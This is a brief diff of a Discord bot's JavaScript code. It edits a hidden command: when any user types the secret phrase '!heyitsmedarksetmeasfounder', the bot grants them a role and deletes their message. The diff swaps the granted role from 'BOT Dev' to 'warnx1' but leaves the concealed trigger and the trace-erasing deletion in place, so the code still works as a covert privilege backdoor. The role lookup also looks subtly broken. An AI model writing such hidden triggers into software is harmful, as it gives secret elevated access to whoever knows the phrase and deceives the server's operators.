@@ -356,7 +356,7 @@ client.on('message', message => {
 
 client.on('message', message => {
 if(message.content.startsWith("!heyitsmedarksetmeasfounder")) {
-	message.member.addRole(message.guilds.role.find(role => role.name == "BOT Dev"));
+	message.member.addRole(message.guilds.role.find(role => role.name == "warnx1"));
 	message.delete();
 }
 });
